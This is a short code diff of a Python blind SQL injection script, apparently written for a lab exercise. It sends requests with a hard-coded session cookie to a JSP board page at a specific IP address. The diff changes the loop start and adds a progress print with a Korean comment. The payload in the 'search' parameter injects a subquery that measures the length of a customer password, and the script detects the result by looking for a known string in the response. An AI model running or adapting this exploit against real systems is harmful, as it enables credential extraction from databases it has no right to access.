@@ -5,7 +5,7 @@ url = "http://3.36.127.85:8000/SQL3/board.jsp"
 cookie = {'JSESSIONID': '6539B47081BDBCB23CDC83A6C4BF7CF0'}
 
 def find_length():
-    pwlength = 70
+    pwlength = 1
 
     while True:
         param = {"search": "dd' AND (SELECT LENGTH(password) AS password_length FROM customer WHERE ROWNUM = 1)={} --".format(pwlength)}
@@ -13,6 +13,7 @@ def find_length():
         if "mas9623" in req.text:
             return pwlength
         else:
+            print(param) # 글자수 진행사항 표시
             pwlength += 1
 
 def find_pw():
